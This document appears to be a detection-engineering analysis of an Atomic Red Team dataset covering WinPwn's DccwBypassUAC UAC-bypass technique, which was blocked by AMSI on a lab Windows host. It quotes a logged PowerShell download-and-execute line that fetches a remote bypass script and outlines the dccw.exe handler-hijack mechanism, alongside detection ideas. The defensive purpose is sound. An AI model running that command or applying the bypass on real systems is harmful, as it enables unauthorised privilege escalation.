# T1548.002-21: Bypass User Account Control — WinPwn - UAC Bypass DccwBypassUAC Technique

## Technique Context

T1548.002 (Bypass User Account Control) covers techniques for silently elevating process privileges. WinPwn's `DccwBypassUAC` technique targets `dccw.exe` (the Display Color Calibration Wizard), a Windows binary that is auto-elevate and reads file handler associations from HKCU. By registering a hijacked handler before launching `dccw.exe`, an attacker can cause the auto-elevated binary to execute attacker-controlled code. Unlike other WinPwn techniques in this series, `DccwBypassUAC` is fetched from a separate obfuscated PowerShell script (`dccuac.ps1`) hosted in a different repository (`S3cur3Th1sSh1t/Creds`), indicating it is maintained independently from the main WinPwn toolkit.

## What This Dataset Contains

The dataset captures approximately 9 seconds of activity on ACME-WS02 (Windows 11 Enterprise, domain member of acme.local).

**PowerShell script block logging (4104)** records the invocation:

```
{iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/dccuac.ps1')}
```

Note: Unlike tests 18–20, there is no `UACBypass` wrapper call. This technique downloads and directly executes `dccuac.ps1`, which contains a `dccuacbypass` function.

**PowerShell Event 4100** records the AMSI block, with a distinctive difference from the other WinPwn tests:

```
Error Message = At line:1 char:1
+ function dccuacbypass
+ ~~~~~~~~~~~~~~~~~~~~~
This script contains malicious content and has been blocked by your antivirus software.
Fully Qualified Error ID = ScriptContainedMaliciousContent,Microsoft.PowerShell.Commands.InvokeExpressionCommand
```

The error shows that the `function dccuacbypass` declaration was the first line of `dccuac.ps1` that AMSI scanned, confirming the script was partially or fully downloaded before the block fired. The function name `dccuacbypass` is visible in the error output.

**Sysmon Event 22** (DNS query): `raw.githubusercontent.com` resolved to 185.199.108–111.133.

**Sysmon Event 1**: `whoami.exe` (ART pre-check) and `powershell.exe` for the attack payload.

**Sysmon Events 7, 10, 11, 17**: DLL loads, process access events, PowerShell startup file creation, named pipe — consistent with the ART test framework.

**PowerShell 4103**: `Set-ExecutionPolicy -Bypass -Scope Process -Force` (two instances, ART test framework) and `New-Object -TypeName net.webclient`.

## What This Dataset Does Not Contain (and Why)

**No dccw.exe execution or registry manipulation**: AMSI blocked `dccuac.ps1` before the `dccuacbypass` function could execute. No `dccw.exe` process creation, HKCU COM handler writes, or elevated payload execution appears.

**No TCP network connection event (Sysmon Event 3)**: The connection to GitHub is absent from the Sysmon data for this test, similar to test 20. DNS resolution (Event 22) is present. This may indicate the AMSI block fired during or immediately after the download, before a connection event was generated, or that the event fell outside the time-window filter.

**No obfuscated script body**: The AMSI block prevented `dccuac.ps1`'s function body from being logged in full as a 4104 script block.

**No Sysmon Event 3**: Despite the DNS resolution, no corresponding TCP connection is captured — consistent with test 20's pattern and possibly indicating the connection event timing.

## Assessment

The DccwBypassUAC technique was blocked by Windows Defender AMSI before execution. The dataset is structurally consistent with tests 18–20 but has two notable differences: the source repository is different (`Creds` vs `WinPwn`), and the 4100 error message exposes the beginning of the actual script content (`function dccuacbypass`), which does not occur in the other WinPwn blocks where the header comment line is what AMSI flags. This distinction is useful for writing repository-agnostic detections that match on the behavioral pattern rather than a specific URL.

## Detection Opportunities Present in This Data

- **PowerShell 4104**: `iex(new-object net.webclient).downloadstring(...)` fetching from `S3cur3Th1sSh1t/Creds/...` or any `obfuscatedps/` path on GitHub is a distinct indicator compared to the main WinPwn URL.
- **PowerShell 4100**: The `ScriptContainedMaliciousContent` error showing `function dccuacbypass` in the error message is a unique artifact that can be used to identify this specific technique even when the URL varies.
- **Sysmon Event 22**: DNS query for `raw.githubusercontent.com` from SYSTEM-context `powershell.exe` — consistent detection anchor across all four WinPwn-family tests in this series.
- **Repository diversity**: This test demonstrates that WinPwn-based UAC bypass detection cannot rely solely on a single GitHub URL; the `Creds` repository hosts separate technique scripts. Detections should match on the `iex(downloadstring(...))` + GitHub pattern broadly, not just the WinPwn.ps1 URL.
- **AMSI error content**: The text appearing after the `+` line in `ScriptContainedMaliciousContent` errors can expose function names and script structure, providing additional hunting value beyond simple block detection.
